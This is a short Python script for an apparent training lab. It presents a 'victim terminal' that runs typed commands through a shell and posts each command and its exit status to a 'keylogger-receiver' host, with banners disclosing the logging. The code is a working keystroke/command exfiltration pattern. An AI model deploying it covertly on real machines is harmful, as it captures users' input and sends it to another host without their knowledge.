import json
import urllib.request
import subprocess

RECEIVER = "http://keylogger-receiver-v2:5000/events"
sequence = 0

def send_event(event_type, text, status=None):
    global sequence
    sequence += 1
    event = {
        "source": "victim_terminal",
        "event_type": event_type,
        "key": "Enter",
        "text": text,
        "sequence": sequence
    }
    if status is not None:
        event["exit_status"] = status

    request = urllib.request.Request(
        RECEIVER,
        data=json.dumps(event).encode(),
        headers={"Content-Type": "application/json"},
        method="POST"
    )
    try:
        with urllib.request.urlopen(request, timeout=5) as response:
            response.read()
    except Exception as error:
        print(f"[Logging error: {error}]")

print("=== Isolated Victim Terminal ===")
print("Commands are logged to the lab receiver.")
print("Type 'exit' to end the session.")
print("Do not enter passwords or private information.")

while True:
    try:
        command = input("victim$ ")
    except (EOFError, KeyboardInterrupt):
        print("\nSession ended.")
        break

    if not command.strip():
        continue

    if command.strip() == "exit":
        send_event("terminal_command", command)
        print("Session ended.")
        break

    send_event("terminal_command", command)

    try:
        result = subprocess.run(
            command,
            shell=True,
            cwd="/workspace",
            capture_output=True,
            text=True,
            timeout=20
        )
        if result.stdout:
            print(result.stdout, end="")
        if result.stderr:
            print(result.stderr, end="")
        send_event("terminal_result", command, result.returncode)
    except subprocess.TimeoutExpired:
        print("Command timed out.")
        send_event("terminal_result", command, 124)
